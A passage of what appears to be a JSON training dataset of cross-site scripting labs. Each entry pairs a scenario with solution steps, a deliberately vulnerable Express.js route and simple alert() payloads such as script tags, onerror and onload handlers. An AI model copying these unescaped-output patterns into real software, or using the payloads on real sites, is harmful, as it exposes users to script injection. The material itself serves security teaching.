        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const name = req.body.name;\n  res.send(`<p>Thanks ${name} for subscribing!</p>`);\n});",
        "payloads": [
            "<script>alert('NewsletterXSS')</script>",
            "<img src=x onerror=alert('SubXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in student report comment section",
        "Lab Description": "Teachers leave comments on student reports. These comments are stored and rendered without filtering.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a report comment: <script>alert('ReportXSS')</script>.",
            "Login as admin and view the comment section.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-report', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO report_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment submitted');\n});",
        "payloads": [
            "<script>alert('ReportXSS')</script>",
            "<img src=x onerror=alert('Report')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in project collaboration note",
        "Lab Description": "Project collaboration tool allows team members to leave notes. Notes are rendered directly without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add note with <script>alert('ProjectXSS')</script>.",
            "Open project dashboard and confirm execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-note', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO project_notes (text) VALUES (?)\", [note]);\n  res.send('Note added');\n});",
        "payloads": [
            "<script>alert('ProjectXSS')</script>",
            "<img src=x onerror=alert('NoteXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel site trip review",
        "Lab Description": "Users review trips and the reviews are displayed without escaping, allowing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a trip review with <script>alert('TravelXSS')</script>.",
            "Reload the trip page to trigger the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-review', (req, res) => {\n  const review = req.body.review;\n  db.query(\"INSERT INTO travel_reviews (content) VALUES (?)\", [review]);\n  res.send('Review submitted');\n});",
        "payloads": [
            "<script>alert('TravelXSS')</script>",
            "<img src=x onerror=alert('Trip')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in e-ticketing system message field",
        "Lab Description": "The e-ticketing portal allows users to send messages to support. The messages are stored and displayed to staff without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a ticket with <script>alert('TicketXSS')</script> in message.",
            "Login as support staff and view the ticket.",
            "Observe script execution on ticket detail page."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO tickets (message) VALUES (?)\", [msg]);\n  res.send('Ticket submitted');\n});",
        "payloads": [
            "<script>alert('TicketXSS')</script>",
            "<img src=x onerror=alert('Ticket')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in internal employee feedback form",
        "Lab Description": "The HR system allows employees to give anonymous feedback. Input is rendered without sanitization in the dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback: <script>alert('Feedback')</script>.",
            "Login as HR and open dashboard.",
            "Observe payload executing in browser."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO employee_feedback (text) VALUES (?)\", [feedback]);\n  res.send('Feedback recorded');\n});",
        "payloads": [
            "<script>alert('Feedback')</script>",
            "<svg onload=alert('HR')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in healthcare system symptoms notes",
        "Lab Description": "Patients submit symptom notes, which are viewed by doctors. Input is saved and reflected without filtering.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Login as patient and submit: <script>alert('DoctorXSS')</script> in symptoms.",
            "Login as doctor and read notes.",
            "Observe XSS execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-symptoms', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO symptoms (note) VALUES (?)\", [note]);\n  res.send('Submitted');\n});",
        "payloads": [
            "<script>alert('DoctorXSS')</script>",
            "<img src=x onerror=alert('HealthXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in booking confirmation notes",
        "Lab Description": "Users can leave additional notes during booking. These notes are stored and rendered without sanitization on admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit booking with <script>alert('BookingXSS')</script> as note.",
            "Login as admin and view bookings.",
            "Observe script running."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/book', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO bookings (note) VALUES (?)\", [note]);\n  res.send('Booking confirmed');\n});",
        "payloads": [
            "<script>alert('BookingXSS')</script>",
            "<img src=x onerror=alert('BookNote')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug report reproduction steps",
        "Lab Description": "Bug tracker stores user-submitted reproduction steps. The steps are rendered for developers without filtering.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit bug with <script>alert('BugXSS')</script> in steps.",
            "Login as developer and open report.",
            "Observe payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/report-bug', (req, res) => {\n  const steps = req.body.steps;\n  db.query(\"INSERT INTO bug_reports (steps) VALUES (?)\", [steps]);\n  res.send('Bug submitted');\n});",
        "payloads": [
            "<script>alert('BugXSS')</script>",
            "<svg/onload=alert('StepsXSS')>"
        ]
    },
    {
        "Lab scenario": "Reflected XSS in mobile recharge confirmation screen",
        "Lab Description": "Recharge form reflects submitted phone number in the confirmation view without sanitization.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit phone number: <script>alert('Recharge')</script>.",
            "Observe execution in confirmation."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/recharge', (req, res) => {\n  const number = req.body.phone;\n  res.send(`<h3>Recharged: ${number}</h3>`);\n});",
        "payloads": [
            "<script>alert('Recharge')</script>",
            "<svg onload=alert('PhoneXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user suggestions submission field",
        "Lab Description": "Public suggestion box accepts suggestions that are rendered for moderators without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit: <script>alert('Suggestion')</script> as a suggestion.",
            "Login as moderator and read suggestions.",
            "Confirm XSS payload execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-suggestion', (req, res) => {\n  const suggestion = req.body.suggestion;\n  db.query(\"INSERT INTO suggestions (text) VALUES (?)\", [suggestion]);\n  res.send('Thank you');\n});",
        "payloads": [
            "<script>alert('Suggestion')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in forum private message feature",
        "Lab Description": "Private messages are displayed in inbox without escaping, allowing stored XSS.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send PM with <script>alert('PM')</script>.",
            "Login as recipient and open inbox.",
            "Observe alert triggered."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/send-message', (req, res) => {\n  const content = req.body.message;\n  db.query(\"INSERT INTO messages (content) VALUES (?)\", [content]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('PM')</script>",
            "<svg onload=alert('InboxXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in community voting comments",
        "Lab Description": "Users can comment on votes. Comments are rendered without sanitization in the result page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Add comment: <script>alert('VoteXSS')</script>.",
            "Visit vote results page.",
            "Observe alert execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment-vote', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO vote_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment submitted');\n});",
        "payloads": [
            "<script>alert('VoteXSS')</script>",
            "<img src=x onerror=alert('VoteComment')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event registration custom message",
        "Lab Description": "Users can leave custom messages when registering for an event. These are rendered without escaping in admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Register for event with <script>alert('Event')</script> as message.",
            "Admin views the registration list.",
            "Observe XSS payload triggering."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/register-event', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO registrations (message) VALUES (?)\", [msg]);\n  res.send('Registered');\n});",
        "payloads": [
            "<script>alert('Event')</script>",
            "<svg/onload=alert('EventXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in job application cover letter",
        "Lab Description": "Job applicants can submit a cover letter. The input is stored and displayed to recruiters without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit application with <script>alert('CoverXSS')</script> in the cover letter.",
            "Login as recruiter and view application.",
            "Observe alert triggered on load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/apply-job', (req, res) => {\n  const cover = req.body.cover;\n  db.query(\"INSERT INTO applications (cover_letter) VALUES (?)\", [cover]);\n  res.send('Application submitted');\n});",
        "payloads": [
            "<script>alert('CoverXSS')</script>",
            "<img src=x onerror=alert('Cover')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in newsletter subscription notes",
        "Lab Description": "The newsletter form includes an optional note field. Notes are displayed to admins without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Subscribe with note <script>alert('NoteXSS')</script>.",
            "Login as admin and view subscriptions.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/subscribe', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO subscribers (note) VALUES (?)\", [note]);\n  res.send('Subscribed');\n});",
        "payloads": [
            "<script>alert('NoteXSS')</script>",
            "<svg onload=alert('Note')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in feature request title",
        "Lab Description": "Users submit feature requests. The title is stored and displayed without sanitization on admin panel.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit: <script>alert('Feature')</script> as title.",
            "Login as admin and open requests list.",
            "Observe XSS payload triggered."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/request-feature', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO features (title) VALUES (?)\", [title]);\n  res.send('Request submitted');\n});",
        "payloads": [
            "<script>alert('Feature')</script>",
            "<img src=x onerror=alert('FeatureXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in ride-sharing app driver feedback",
        "Lab Description": "Passengers leave feedback for drivers. Input is stored and rendered without escaping on driver dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit feedback with <script>alert('Driver')</script>.",
            "Login as driver and view feedback.",
            "Observe alert triggered."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const feedback = req.body.feedback;\n  db.query(\"INSERT INTO driver_feedback (text) VALUES (?)\", [feedback]);\n  res.send('Thanks');\n});",
        "payloads": [
            "<script>alert('Driver')</script>",
            "<svg/onload=alert('RideXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug bounty program POC URL",
        "Lab Description": "Bug reporters submit a POC URL. It's rendered without escaping in admin reports dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit POC URL as: javascript:alert('Bug')",
            "Login as admin and view report list.",
            "Observe JS execution via malformed link."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-bug', (req, res) => {\n  const url = req.body.poc;\n  db.query(\"INSERT INTO bugs (url) VALUES (?)\", [url]);\n  res.send('Report received');\n});",
        "payloads": [
            "<a href='javascript:alert(`POC`)'>POC</a>",
            "<iframe src='javascript:alert(1)'></iframe>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in travel booking special instructions",
        "Lab Description": "Users leave special instructions during travel booking. Input is rendered without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Book trip with <script>alert('Travel')</script>.",
            "Admin views booking.",
            "Observe execution of injected script."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/travel-booking', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO travel_notes (note) VALUES (?)\", [note]);\n  res.send('Trip booked');\n});",
        "payloads": [
            "<script>alert('Travel')</script>",
            "<img src=x onerror=alert('Trip')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in auction platform product question",
        "Lab Description": "Buyers can ask public questions. The input is not sanitized before display.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Ask question: <script>alert('Auction')</script>.",
            "Seller views Q&A tab.",
            "Confirm payload executes."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/ask-question', (req, res) => {\n  const q = req.body.question;\n  db.query(\"INSERT INTO questions (text) VALUES (?)\", [q]);\n  res.send('Submitted');\n});",
        "payloads": [
            "<script>alert('Auction')</script>",
            "<svg/onload=alert('QnAXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bank contact form message field",
        "Lab Description": "Bank contact form messages are shown to operators without any escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit message: <script>alert('Bank')</script>.",
            "Login as operator and view inbox.",
            "Script runs on page load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact-bank', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO contact_messages (text) VALUES (?)\", [msg]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('Bank')</script>",
            "<img src=x onerror=alert('BankXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in quiz app answer explanation field",
        "Lab Description": "Instructors submit explanation text that is reflected unescaped in quiz preview.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit explanation with <script>alert('Quiz')</script>.",
            "Preview question and confirm execution.",
            "Test different payload formats."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-explanation', (req, res) => {\n  const text = req.body.explanation;\n  db.query(\"INSERT INTO explanations (text) VALUES (?)\", [text]);\n  res.send('Saved');\n});",
        "payloads": [
            "<script>alert('Quiz')</script>",
            "<svg onload=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracking system tag field",
        "Lab Description": "Bugs can be tagged. Tags are reflected on pages without encoding.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit tag as <script>alert('Tag')</script>.",
            "View bug page.",
            "Observe execution of XSS."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  const tag = req.body.tag;\n  db.query(\"INSERT INTO bug_tags (tag) VALUES (?)\", [tag]);\n  res.send('Tag added');\n});",
        "payloads": [
            "<script>alert('Tag')</script>",
            "<img src=x onerror=alert('BugTag')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in user-submitted tutorial title",
        "Lab Description": "Users submit tutorials with titles that are rendered in the dashboard without sanitization. A malicious title can trigger script execution.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit a tutorial with <script>alert('Tutorial')</script> as the title.",
            "Login as admin and open the tutorial dashboard.",
            "Observe script execution on load."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-tutorial', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO tutorials (title) VALUES (?)\", [title]);\n  res.send('Tutorial submitted');\n});",
        "payloads": [
            "<script>alert('Tutorial')</script>",
            "<img src=x onerror=alert('XSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in payment comment field",
        "Lab Description": "During payment, users can add comments. These are stored and shown in the transaction history with no escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Make a payment with <script>alert('Payment')</script> as comment.",
            "Open transaction history.",
            "Observe XSS execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/pay', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO transactions (comment) VALUES (?)\", [comment]);\n  res.send('Payment successful');\n});",
        "payloads": [
            "<script>alert('Payment')</script>",
            "<svg/onload=alert('PayXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in e-learning discussion reply",
        "Lab Description": "Students reply to threads. Replies are stored and rendered on the thread page with no sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit reply: <script>alert('ReplyXSS')</script>.",
            "Reload thread page.",
            "Observe execution of the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/post-reply', (req, res) => {\n  const reply = req.body.reply;\n  db.query(\"INSERT INTO replies (text) VALUES (?)\", [reply]);\n  res.send('Reply posted');\n});",
        "payloads": [
            "<script>alert('ReplyXSS')</script>",
            "<img src=x onerror=alert('Reply')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in donation platform donor message",
        "Lab Description": "Donors can leave a message. These are rendered without escaping in the public donation wall.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Donate with <script>alert('Donate')</script> as the message.",
            "View donation wall.",
            "Confirm payload executes."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/donate', (req, res) => {\n  const msg = req.body.message;\n  db.query(\"INSERT INTO donations (message) VALUES (?)\", [msg]);\n  res.send('Thank you');\n});",
        "payloads": [
            "<script>alert('Donate')</script>",
            "<svg/onload=alert('Wall')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in restaurant order notes",
        "Lab Description": "Food ordering system allows custom notes per order. These are rendered to staff dashboards unsanitized.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Place order with <script>alert('Order')</script> in notes.",
            "Login as restaurant staff.",
            "Observe alert triggered on viewing order."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/order', (req, res) => {\n  const note = req.body.note;\n  db.query(\"INSERT INTO orders (note) VALUES (?)\", [note]);\n  res.send('Order placed');\n});",
        "payloads": [
            "<script>alert('Order')</script>",
            "<img src=x onerror=alert('Food')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in lost & found item description",
        "Lab Description": "Users post found items with a description. The content is displayed without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Post item with <script>alert('Lost')</script>.",
            "Go to listing page and observe execution.",
            "Confirm persistence."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/found-item', (req, res) => {\n  const desc = req.body.description;\n  db.query(\"INSERT INTO items (description) VALUES (?)\", [desc]);\n  res.send('Item listed');\n});",
        "payloads": [
            "<script>alert('Lost')</script>",
            "<svg onload=alert('Found')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in product inquiry form",
        "Lab Description": "Visitors can ask questions about products. The input is stored and shown on product pages without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Ask question: <script>alert('Product')</script>.",
            "View product page and trigger payload.",
            "Try encoded variations too."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/product-question', (req, res) => {\n  const question = req.body.question;\n  db.query(\"INSERT INTO inquiries (question) VALUES (?)\", [question]);\n  res.send('Question sent');\n});",
        "payloads": [
            "<script>alert('Product')</script>",
            "<img src=x onerror=alert('Inquiry')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in calendar event title",
        "Lab Description": "A calendar app allows event titles to be stored and displayed in daily views. No sanitization is applied.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create event with title <script>alert('Calendar')</script>.",
            "View day view calendar.",
            "Observe alert triggered."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-event', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO events (title) VALUES (?)\", [title]);\n  res.send('Event created');\n});",
        "payloads": [
            "<script>alert('Calendar')</script>",
            "<img src=x onerror=alert('DayView')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in online petition reason field",
        "Lab Description": "Petitioners submit a reason, which is rendered in supporter feeds unsanitized.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Sign petition with reason <script>alert('Petition')</script>.",
            "View recent supporters.",
            "Observe payload triggering."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/sign-petition', (req, res) => {\n  const reason = req.body.reason;\n  db.query(\"INSERT INTO signatures (reason) VALUES (?)\", [reason]);\n  res.send('Signed');\n});",
        "payloads": [
            "<script>alert('Petition')</script>",
            "<svg onload=alert('SignXSS')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in help desk system subject field",
        "Lab Description": "Support tickets have subjects stored and shown unescaped in agent inbox.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit ticket with subject <script>alert('Support')</script>.",
            "Login as agent and open inbox.",
            "Trigger the payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create-ticket', (req, res) => {\n  const subject = req.body.subject;\n  db.query(\"INSERT INTO tickets (subject) VALUES (?)\", [subject]);\n  res.send('Ticket created');\n});",
        "payloads": [
            "<script>alert('Support')</script>",
            "<img src=x onerror=alert('HelpDesk')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in profile tag line",
        "Lab Description": "A social network allows users to set a public tagline. This tagline is stored and displayed on profile pages without sanitization.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Go to profile settings and update tag line to <script>alert('TagXSS')</script>.",
            "Save changes and visit the public profile.",
            "Observe alert execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-tagline', (req, res) => {\n  const tagline = req.body.tagline;\n  db.query(\"UPDATE users SET tagline = ? WHERE id = ?\", [tagline, req.user.id]);\n  res.send('Tagline updated');\n});",
        "payloads": [
            "<script>alert('TagXSS')</script>",
            "<img src=x onerror=alert('Tag')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in recipe platform comments",
        "Lab Description": "A cooking site lets users comment on recipes. These comments are stored and rendered directly without escaping.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Post comment: <script>alert('Recipe')</script> on any recipe.",
            "View comment section and observe execution.",
            "Check persistence across sessions."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query(\"INSERT INTO recipe_comments (text) VALUES (?)\", [comment]);\n  res.send('Comment added');\n});",
        "payloads": [
            "<script>alert('Recipe')</script>",
            "<svg/onload=alert('Comment')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in bug tracker issue title",
        "Lab Description": "A bug tracking system allows custom issue titles. These titles are stored and displayed in project views without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Submit issue with <script>alert('IssueXSS')</script> as title.",
            "Navigate to the project issues list.",
            "Observe execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-issue', (req, res) => {\n  const title = req.body.title;\n  db.query(\"INSERT INTO issues (title) VALUES (?)\", [title]);\n  res.send('Issue submitted');\n});",
        "payloads": [
            "<script>alert('IssueXSS')</script>",
            "<img src=x onerror=alert('Bug')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in contact us name field",
        "Lab Description": "The contact form stores the 'name' input and displays it in the admin dashboard without escaping.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
            "Submit form with name: <script>alert('Contact')</script>.",
            "Login as admin and open messages.",
            "Observe execution of payload."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  db.query(\"INSERT INTO messages (name) VALUES (?)\", [name]);\n  res.send('Message sent');\n});",
        "payloads": [
            "<script>alert('Contact')</script>",
            "<svg/onload=alert('Form')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in code snippet sharing site",
        "Lab Description": "A developer platform allows code snippets to be shared. The 'description' field is stored and rendered without escaping.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Create a new snippet with <script>alert('Code')</script> as description.",
            "Visit snippet details page.",
            "Observe script execution."
        ],
        "Vulnerability name": "Cross-site scripting",
        "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/share-snippet', (req, res) => {\n  const description = req.body.description;\n  db.query(\"INSERT INTO snippets (description) VALUES (?)\", [description]);\n  res.send('Snippet shared');\n});",
        "payloads": [
            "<script>alert('Code')</script>",
            "<img src=x onerror=alert('Snippet')>"
        ]
    },
    {
        "Lab scenario": "Stored XSS in event planner custom message",
        "Lab Description": "Users can send custom invites with a personal message. The message is shown on the invite view page unescaped.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
            "Send invite with <script>alert('Invite')</script> as message.",
            "Open the invitation link.",
            "Confirm payload executes."
        ],
        "Vulnerability name": "Cross-site scripting",
